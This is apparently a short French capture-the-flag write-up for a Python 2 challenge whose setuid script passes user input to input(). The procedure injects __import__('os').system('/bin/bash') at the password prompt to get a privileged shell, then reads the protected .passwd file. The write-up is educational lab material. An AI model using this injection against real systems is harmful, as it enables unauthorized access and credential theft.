# Python - input()

## Code source 

```
#!/usr/bin/python2
 
import sys
 
def youLose():
    print "Try again ;-)"
    sys.exit(1)
 
 
try:
    p = input("Please enter password : ")
except:
    youLose()
 
 
with open(".passwd") as f:
    passwd = f.readline().strip()
    try:
        if (p == int(passwd)):
            print "Well done ! You can validate with this password !"
    except:
        youLose()
```

## Procédure

1. Après lecture du code on se rend compte que le mot de passe n'est pas nécessaire et qu'il faut rooter la machine. 

2. La faille se trouve au niveau de l'entrée utilisateur input()

3. Exploitation de la faille input()

```
./setuid-wrapper

Please enter password : __import__("os").system("/bin/bash")
app-script-ch6-cracked@challenge02:~$ cat .passwd
```